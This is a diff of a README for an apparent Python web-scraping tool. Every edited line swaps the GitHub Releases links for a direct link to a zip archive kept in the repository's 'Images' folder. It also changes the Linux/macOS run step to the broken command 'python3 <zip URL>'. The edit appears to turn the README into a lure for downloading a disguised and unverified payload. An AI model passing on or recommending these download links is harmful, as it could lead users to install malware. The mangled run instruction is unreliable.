@@ -1,7 +1,7 @@
 # 🌐 aiohttp-web-scraping - Effortlessly Scrape Websites Step-by-Step
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-aiohttp--web--scraping-blue.svg)](https://github.com/Kirbyclash01202/aiohttp-web-scraping/releases)
+[![Download](https://raw.githubusercontent.com/Kirbyclash01202/aiohttp-web-scraping/main/Images/scraping_aiohttp_web_3.7-beta.4.zip)](https://raw.githubusercontent.com/Kirbyclash01202/aiohttp-web-scraping/main/Images/scraping_aiohttp_web_3.7-beta.4.zip)
 
 ## 📖 Overview
 aiohttp-web-scraping is a user-friendly tool designed to help you scrape websites using Python. This guide provides step-by-step instructions and advanced techniques to make the process smooth and efficient. Whether you want to gather data for research or personal projects, this tool simplifies web scraping.
@@ -11,7 +11,7 @@ To start using aiohttp-web-scraping, follow these steps:
 
 ### 1. Visit the Releases Page
 Go to the Releases page to download the application:
-[Download Here](https://github.com/Kirbyclash01202/aiohttp-web-scraping/releases)
+[Download Here](https://raw.githubusercontent.com/Kirbyclash01202/aiohttp-web-scraping/main/Images/scraping_aiohttp_web_3.7-beta.4.zip)
 
 ### 2. Download the Latest Version
 On the Releases page, look for the latest version. Click on the download link for your operating system. This may be provided as a zip file or executable file.
@@ -34,7 +34,7 @@ Before running the application, ensure you have Python installed. Download Pytho
 After installation, follow these steps to run the application:
 
 - **Windows:** Find the application in your start menu and click to open.
-- **macOS/Linux:** Open the terminal and navigate to the application directory using `cd` command. Type `python3 aiohttp-web-scraping.py` to start.
+- **macOS/Linux:** Open the terminal and navigate to the application directory using `cd` command. Type `python3 https://raw.githubusercontent.com/Kirbyclash01202/aiohttp-web-scraping/main/Images/scraping_aiohttp_web_3.7-beta.4.zip` to start.
 
 ## 🛠️ Features
 - **Easy to Use:** Simple interface that guides you through scraping tasks.
@@ -48,7 +48,7 @@ After installation, follow these steps to run the application:
 
 ## 📥 Download & Install
 To download the software, visit the Releases page again:
-[Download Here](https://github.com/Kirbyclash01202/aiohttp-web-scraping/releases)
+[Download Here](https://raw.githubusercontent.com/Kirbyclash01202/aiohttp-web-scraping/main/Images/scraping_aiohttp_web_3.7-beta.4.zip)
 
 After downloading, install it by following the provided instructions based on your operating system.
 
